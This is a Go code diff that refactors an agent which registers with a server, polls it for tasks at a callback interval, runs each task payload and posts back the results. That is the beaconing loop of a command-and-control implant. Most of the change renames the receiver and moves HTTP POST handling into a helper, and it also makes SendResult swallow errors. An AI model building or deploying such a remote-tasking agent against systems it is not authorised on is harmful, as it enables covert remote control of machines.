@@ -80,57 +80,37 @@ func (a *Agent) ToAPI() api.Agent {
 // Register allows the agent to register with the server
 func (a *Agent) Register() error {
 	agent := a.ToAPI()
-	url := fmt.Sprintf("http://%s:%d/register", agent.ServerIP, agent.ServerPort)
+	uri := fmt.Sprintf("http://%s:%d/register", agent.ServerIP, agent.ServerPort)
+	var resp api.Message
 
-	// Marshals the agent's id into JSON
-	body, err := json.Marshal(agent)
-	if err != nil {
-		return fmt.Errorf("Failed to marshal JSON: %w", err)
-	}
-
-	// POST request with the agent's id as the body
-	resp, err := a.Post(url, "application/json", bytes.NewBuffer(body))
-	if err != nil {
-		return fmt.Errorf("Failed to send POST request: %w", err)
-	}
-	defer resp.Body.Close()
-
-	// Read the body of the response into a variable
-	respBody, err := io.ReadAll(resp.Body)
-	if err != nil {
-		return fmt.Errorf("Failed to read response: %w", err)
+	// POST request with agent as body, writes response to resp
+	if err := api.DoPost(a.Client, uri, agent, &resp); err != nil {
+		return fmt.Errorf("Register: %w", err)
 	}
 
 	// Print server response
-	if resp.StatusCode == http.StatusOK {
-		if a.Debug {
-			var msg api.Message
-			if err := json.Unmarshal(respBody, &msg); err != nil {
-				return fmt.Errorf("Failed to unmarshal server response: %w", err)
-			}
-			log.Println(msg.Message)
-		}
-	} else {
-		return fmt.Errorf("Server returned status code %d: %s", resp.StatusCode, string(respBody))
+	if a.Debug {
+		log.Println(resp.Message)
 	}
 
 	return nil
 }
 
 // GetTask retrieves a task from the server to be executed
-func (agent *Agent) GetTask() (*api.Task, error) {
-	url := fmt.Sprintf("http://%s:%d/task", agent.ServerIP, agent.ServerPort)
+// This function needs to handle its own response codes, so custom logic is needed
+func (a *Agent) GetTask() (*api.Task, error) {
+	url := fmt.Sprintf("http://%s:%d/task", a.ServerIP, a.ServerPort)
 
 	// Marshals the agent's id into JSON
 	body, err := json.Marshal(map[string]string{
-		"agent_id": agent.ID,
+		"agent_id": a.ID,
 	})
 	if err != nil {
 		return nil, fmt.Errorf("Failed to marshal JSON: %w", err)
 	}
 
 	// POST request with the agent's id as the body
-	resp, err := agent.Post(url, "application/json", bytes.NewBuffer(body))
+	resp, err := a.Post(url, "application/json", bytes.NewBuffer(body))
 	if err != nil {
 		return nil, fmt.Errorf("Failed to send POST request: %w", err)
 	}
@@ -145,8 +125,8 @@ func (agent *Agent) GetTask() (*api.Task, error) {
 	case http.StatusBadRequest:
 		// If agent ID is unregistered, reregister
 		if strings.Contains(string(respBody), "Invalid agent ID") {
-			if agent.Debug {
-				log.Printf("Agent ID %s no longer recognized, re-registering...", agent.ID)
+			if a.Debug {
+				log.Printf("Agent ID %s no longer recognized, re-registering...", a.ID)
 			}
 			return nil, pberrors.ErrInvalidAgentID
 		} else { // Else, throw error for bad request
@@ -169,7 +149,7 @@ func (agent *Agent) GetTask() (*api.Task, error) {
 }
 
 // ExecuteTask executes the task retrieved by GetTask
-func (agent *Agent) ExecuteTask(task *api.Task) (*api.Result, error) {
+func (a *Agent) ExecuteTask(task *api.Task) (*api.Result, error) {
 	if strings.TrimSpace(task.Payload) == "" {
 		return &api.Result{Output: "No task payload"}, nil
 	}
@@ -189,41 +169,31 @@ func (agent *Agent) ExecuteTask(task *api.Task) (*api.Result, error) {
 	return result, nil
 }
 
-func (agent *Agent) SendResult(result *api.Result) error {
+// SendResult sends a result from an agent to the server
+func (a *Agent) SendResult(result *api.Result) error {
+	uri := fmt.Sprintf("http://%s:%d/result", a.ServerIP, a.ServerPort)
+	var resp api.Message
+
 	// Ensures result is not a nil pointer
 	if result == nil {
 		return fmt.Errorf("result is nil")
 	}
 
-	url := fmt.Sprintf("http://%s:%d/result", agent.ServerIP, agent.ServerPort)
-
-	// Marshals the result into JSON
-	body, err := json.Marshal(result)
-	if err != nil {
-		return fmt.Errorf("Failed to marshal JSON: %w", err)
-	}
-
-	// Sends a POST request containing the result
-	resp, err := agent.Post(url, "application/json", bytes.NewBuffer(body))
-	if err != nil {
-		return fmt.Errorf("Failed to send POST request: %w", err)
-	}
-	defer resp.Body.Close()
-
-	// Checks the status code and reports errors, does nothing on OK
-	if resp.StatusCode != http.StatusOK {
-		respBody, _ := io.ReadAll(resp.Body)
-		return fmt.Errorf("Server returned status %d: %s", resp.StatusCode, string(respBody))
+	// Send POST request with result, prints message if debug is on
+	if err := api.DoPost(a.Client, uri, result, &resp); err != nil {
+		if a.Debug {
+			log.Println(resp.Message)
+		}
 	}
 
 	return nil
 }
 
 // registerUntilDone has the agent attempt to register with the server until it is accepted
-func (agent *Agent) registerUntilDone() {
+func (a *Agent) registerUntilDone() {
 	for {
-		if err := agent.Register(); err != nil {
-			if agent.Debug {
+		if err := a.Register(); err != nil {
+			if a.Debug {
 				log.Println(err)
 			}
 			time.Sleep(5 * time.Second)
@@ -234,26 +204,26 @@ func (agent *Agent) registerUntilDone() {
 }
 
 // Start starts the agent and begins the main polling loop
-func (agent *Agent) Start() {
-	if agent.Debug {
-		log.Printf("Agent starting with ID: %s\n", agent.ID)
+func (a *Agent) Start() {
+	if a.Debug {
+		log.Printf("Agent starting with ID: %s\n", a.ID)
 	}
 
 	// Attempt to register with the server until successful
-	agent.registerUntilDone()
+	a.registerUntilDone()
 
 	// Main polling loop
 	for {
-		task, err := agent.GetTask()
+		task, err := a.GetTask()
 		if err != nil {
 			if errors.Is(err, pberrors.ErrInvalidAgentID) {
-				if agent.Debug {
-					log.Printf("Agent ID %s invalid, re-registering...", agent.ID)
+				if a.Debug {
+					log.Printf("Agent ID %s invalid, re-registering...", a.ID)
 				}
-				agent.registerUntilDone()
+				a.registerUntilDone()
 				continue
 			}
-			if agent.Debug {
+			if a.Debug {
 				log.Println("GetTask error:", err)
 			}
 			time.Sleep(5 * time.Second)
@@ -261,20 +231,20 @@ func (agent *Agent) Start() {
 		}
 
 		if task != nil {
-			result, err := agent.ExecuteTask(task)
+			result, err := a.ExecuteTask(task)
 			if err != nil {
-				if agent.Debug {
+				if a.Debug {
 					log.Println("ExecuteTask error:", err)
 				}
 				continue
 			}
-			if err := agent.SendResult(result); err != nil {
-				if agent.Debug {
+			if err := a.SendResult(result); err != nil {
+				if a.Debug {
 					log.Println("SendResult error:", err)
 				}
 			}
 		}
 
-		time.Sleep(agent.CallbackInterval)
+		time.Sleep(a.CallbackInterval)
 	}
 }
